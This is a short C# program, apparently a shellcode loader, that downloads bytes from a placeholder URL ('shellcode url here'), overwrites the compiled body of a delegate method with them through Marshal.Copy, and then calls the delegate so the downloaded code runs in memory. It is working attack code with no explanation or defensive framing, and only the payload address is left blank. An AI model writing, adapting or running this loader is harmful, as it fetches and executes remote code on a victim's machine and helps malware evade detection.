using System.Net;
using System.Runtime.InteropServices;

namespace test
{
   class Program
    {
        public delegate void d();
        public static void DelegateMethod() {}
        private static void Main(string[] args)
        {
            d temp = DelegateMethod;
            byte[] b = new WebClient().DownloadData("shellcode url here"); 
            Marshal.Copy(b, 0, typeof(Program).GetMethod("DelegateMethod").MethodHandle.GetFunctionPointer(), b.Length);
            temp();
        }
    }
}